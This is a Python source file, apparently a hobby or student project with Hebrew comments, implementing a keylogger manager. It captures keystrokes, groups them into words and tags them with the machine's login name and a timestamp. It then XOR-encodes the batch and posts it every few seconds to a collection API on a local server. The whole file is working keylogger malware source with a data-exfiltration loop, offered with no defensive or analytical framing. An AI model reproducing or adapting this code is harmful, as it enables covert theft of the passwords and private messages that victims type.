from KeyLoggerService import KeyLoggerService 
import   time, os, json, ast, requests
from Enkryptor import Encryptor
waiting_time = 6


from iwriter import IWriter
class  NetworkWriter(IWriter):
    def __init__(self):        
        super().__init__()
    def send_data(self,data):
        try:    
            url = 'http://127.0.0.1:5000/api/keylogges'
            response = requests.post(url,json=data)
        except:
               return None         

class KeyLoggerManager(KeyLoggerService):
    def __init__(self):
        super().__init__()
        self.data = []
        self.word = ''
    #פונקציה שמחברת את האותיות למילים
    def list_to_word(self,list1:list):
     str1 = ''
     list_to_sand = []
     for i in list1:
          str1 += str(i)
     str1 = str1.replace("'",'')
     str1 = str1.split()
     try:
        list_to_sand = str1     
        return list_to_sand
     except:
          return ''     
             
    def start(self):
            from datetime import datetime
            #שומר את שם המחשב
            machine = os.getlogin()
            self.start_logging()
            self.send1 = NetworkWriter()
            self.encryption = Encryptor()
            while True:
                time.sleep(waiting_time)
                list_to_send = self.list_to_word(self.text)
                #שמירת זמן עכשווי
                time1 = str(datetime.now())
                #הכנסת המידע לdict
                jeson = {'time':time1,'data':list_to_send,'machine':machine}
                if len(jeson['data']) == 0:
                            continue
                
                    #jsonהפיכת המילון ל    
                jeson = json.dumps(jeson,ensure_ascii=False)
                    #jsonהצפנת ה
                jeson = self.encryption.encryption_using_xor(jeson,4)
                data = {'data':jeson}
                data = json.dumps(data)
                print(data)
                    #שליחה המידע לשרת
                self.send1.send_data(data)
                self.text.clear()

C = KeyLoggerManager()
C.start()                    

